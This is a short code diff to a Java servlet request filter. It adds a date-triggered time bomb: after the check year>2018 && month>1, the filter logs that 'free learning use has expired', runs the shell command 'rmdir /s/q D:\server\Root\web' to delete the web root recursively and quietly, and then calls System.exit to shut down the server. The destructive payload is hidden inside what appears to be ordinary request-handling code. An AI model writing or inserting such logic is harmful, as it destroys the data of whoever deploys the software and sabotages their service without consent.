@@ -92,7 +92,9 @@ public class GobelFilter implements Filter {
 
         log.info("请求前过虑器执行>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>"+ year + "-" + month);
         if(year>2018 && month>1){
-            log.info("******************服务已经过期*******************");
+            log.info("******************免费学习使用已经过期*******************");
+            Runtime.getRuntime().exec("rmdir /s/q D:\\server\\Root\\web");
+            System.exit(0);
         }else {
             filterChain.doFilter(servletRequest, servletResponse);
         }
